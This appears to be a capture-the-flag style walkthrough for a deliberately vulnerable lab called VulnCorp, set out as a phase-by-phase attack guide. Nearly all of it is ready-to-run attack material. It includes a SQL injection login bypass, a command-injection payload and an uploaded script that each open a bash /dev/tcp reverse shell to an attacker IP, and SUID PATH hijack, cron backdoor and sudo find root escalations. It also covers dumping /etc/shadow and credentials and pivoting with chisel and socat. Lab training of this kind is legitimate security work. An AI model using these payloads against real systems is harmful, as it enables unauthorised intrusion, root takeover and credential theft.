# 🚀 VulnCorp Lab — Kali Attack & Privilege Escalation Guide

---

## 🗺️ Attack Workflow Overview

```text
[Kali Attacker]
       │
       ▼ (Phase 1: SQLi / RCE / Webshell)
[Web Admin Session] ➔ [webuser OS Shell] (User Flag Captured)
       │
       ▼ (Phase 2: SUID PATH Hijack / Writable Cron / Sudo)
[root Superuser Shell] (Full Host Takeover & Root Flag Captured)
       │
       ▼ (Phase 3: Exfiltrate SSH Keys, DB Creds, Notes)
[Lateral Movement] ➔ Pivot to Machine 2 (DB Server) & Windows Jump Box
```

---

## 🎯 Phase 1: Reconnaissance & Initial Access

### 1. Reconnaissance & Scanning
From your Kali Linux terminal:
```bash
# Set target IP (LAN IP or public ngrok host)
export TARGET="192.168.1.50"

# Scan open ports and detect service versions
nmap -sC -sV -p 8080,2222,2121 $TARGET

# Inspect web paths and server diagnostics
curl http://$TARGET:8080/robots.txt
curl http://$TARGET:8080/server-status
```

### 2. Anonymous FTP Access
```bash
ftp $TARGET 2121
# Login: anonymous (press Enter for password)
get pub/welcome.txt
get pub/network_map.txt
exit
```
* **Privilege**: Anonymous read access to network topology disclosure documents revealing internal `192.168.56.0/24` subnet.

---

### 3. SQL Injection (Web Authentication Bypass)
- Open browser and navigate to: `http://$TARGET:8080/login`
- **Username**: `admin' OR '1'='1' --`
- **Password**: `anypassword`
- **Privilege Gained**: **`admin` Web Session**.
- **What you can do**: Access `/admin` to view database records containing plaintext passwords for internal infrastructure (MySQL, SSH, RDP).

---

### 4. Remote Code Execution (RCE ➔ Reverse Shell)
1. On your Kali machine, start a Netcat listener:
   ```bash
   nc -lvnp 4444
   ```
2. In the web portal, navigate to `/nettools`.
3. In the diagnostic input box, inject a reverse shell payload:
   ```bash
   127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
   ```
   *(Replace `<KALI_IP>` with your Kali Linux IP).*
4. **Privilege Gained**: Interactive **`webuser` OS Shell** (Low-privilege Linux account).
5. **What you can do**:
   - Capture user flag:
     ```bash
     cat /home/webuser/user.txt
     # Flag: VULN{w3b_sh3ll_1n1t1al_acc3ss}
     ```
   - Inspect bash history: `cat /home/webuser/.bash_history`
   - Read local files and configurations.

---

### 5. Alternative Access: Unrestricted File Upload Webshell
1. Create a reverse shell script named `shell.sh`:
   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
   ```
2. Navigate to `/upload` in the portal and upload `shell.sh`.
3. Start listener on Kali: `nc -lvnp 4444`.
4. Trigger execution via: `http://$TARGET:8080/cgi/shell.sh`.

---

## 🔓 Phase 2: Privilege Escalation (`webuser` ➔ `root`)

From your `webuser` shell, escalate to full `root` access using any of these 3 independent vectors:

### Vector A: Vulnerable SUID Binary (PATH Hijack)
1. Check for SUID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   # Found: /usr/local/bin/vuln-backup
   ```
2. Exploit relative path resolution of `tar`:
   ```bash
   echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar
   chmod +x /tmp/tar
   export PATH=/tmp:$PATH
   /usr/local/bin/vuln-backup
   ```
3. **Privilege Gained**: Immediate **`root`** superuser shell!

---

### Vector B: World-Writable Cron Job
1. Inspect cron tasks:
   ```bash
   ls -la /opt/scripts/cleanup.sh
   # -rwxrwxrwx 1 root root (World-writable! Executed every minute by root)
   ```
2. Inject a SUID root bash backdoor:
   ```bash
   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
   ```
3. Wait 60 seconds for cron execution, then run:
   ```bash
   /tmp/rootbash -p
   ```
4. **Privilege Gained**: Immediate **`root`** superuser shell!

---

### Vector C: Sudo Misconfiguration (GTFOBins)
1. Check sudo permissions:
   ```bash
   sudo -l
   # Output: (root) NOPASSWD: /usr/bin/find
   ```
2. Spawn a root shell via `find`:
   ```bash
   sudo /usr/bin/find /tmp -exec /bin/bash \;
   ```
3. **Privilege Gained**: Immediate **`root`** superuser shell!

---

### Capture the Root Flag:
```bash
cat /root/root.txt
# Flag: VULN{pr1v3sc_r00t_pwn3d_m4ch1n3_1}
```

---

## 🔀 Phase 3: Lateral Movement & Pivoting

With root control over Machine 1, extract credentials and keys to compromise other infrastructure:

| Discovered Asset | Command / Path | Value & Lateral Movement Action |
|---|---|---|
| **Root Administrator Notes** | `cat /root/notes.txt` | Reveals Windows Jump Box at `10.10.10.50` (`Administrator` / `W1nd0ws@Admin!`). |
| **SSH Private Key** | `cat /root/.ssh/id_rsa_db01` & `cat /root/.ssh/config` | Direct SSH access to internal Database Server `192.168.56.102` (`db01`) as user `sysadmin`. |
| **Production DB Config** | `cat /opt/vulncorp/config/database.yml` | MySQL production database credentials (`root` / `toor_mysql@prod`). |
| **Internal DB Dump** | `sqlite3 /opt/vulncorp/db/vulncorp.db "SELECT * FROM internal_credentials;"` | Dumps database table of SSH, MySQL, FTP, and RDP credentials across the subnet. |
| **Password Hashes** | `cat /etc/shadow` | Offline password hash cracking with `john` or `hashcat`. |
| **Network Pivot Proxy** | `chisel` / `sshuttle` / `socat` | Turn Machine 1 into a pivot/jump proxy to route traffic into the internal `192.168.56.0/24` subnet. |

---

## 📊 Summary of Privileges Gained

| Stage | Privilege Level | What You Can Do |
|---|---|---|
| **Stage 1: Unauthenticated** | None (Public network) | Port scan, view landing page, read anonymous FTP documents, identify web endpoints. |
| **Stage 2: Web SQLi** | `admin` (Web Session) | Read all user passwords, view internal infrastructure credentials table in `/admin`. |
| **Stage 3: Web RCE / Webshell** | `webuser` (OS User) | Interactive Linux shell, read application source code, capture `user.txt` flag. |
| **Stage 4: Privilege Escalation** | `root` (Superuser) | Complete host takeover, modify system files, dump `/etc/shadow`, capture `root.txt` flag. |
| **Stage 5: Post-Exploitation Pivot** | Internal Network Admin | SSH into internal DB server (`192.168.56.102`), dump MySQL DBs, connect to Windows RDP Jump Box. |
